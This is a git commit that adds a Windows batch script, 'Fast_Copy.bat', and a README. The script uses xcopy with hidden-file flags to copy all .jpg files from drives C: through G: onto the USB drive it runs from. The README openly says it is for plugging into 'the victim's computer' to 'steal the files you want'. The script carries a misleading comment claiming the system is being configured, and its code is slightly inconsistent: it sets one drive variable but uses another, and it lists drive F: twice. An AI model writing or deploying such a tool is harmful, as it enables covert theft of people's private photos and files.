a099d975d7306e1b4cec4d6a7c065987abb55fec
CyberMan <69076791+cyberman2000@users.noreply.github.com>
2022-05-01 01:38:53 +0430

    Add files via upload

---
+++ Fast_Copy/Fast_Copy.bat
@@ -0,0 +1,12 @@
+﻿::We are configuring your system.Please do not exit the program or turn off the system
+@echo off
+color c
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
+%backupcmd% "C:\*.jpg" "%drive%\My pics\file_me"
+%backupcmd% "D:\*.jpg" "%drive%\My pics\file_me"
+%backupcmd% "E:\*.jpg" "%drive%\My pics\file_me"
+%backupcmd% "F:\*.jpg" "%drive%\My pics\file_me"
+%backupcmd% "G:\*.jpg" "%drive%\My pics\file_me"
+%backupcmd% "F:\*.jpg" "%drive%\My Pics\file_me"
+@echo off 
---
+++ Fast_Copy/README.txt
@@ -0,0 +1,4 @@
+                   This script was created by CyberMan
+The script is written in batch (*.bat , cmd file)
+What is Fast_Copy : Just copy the script to flash, then connect to the victim's computer and run the script and steal the files you want
+Usage : just windows 
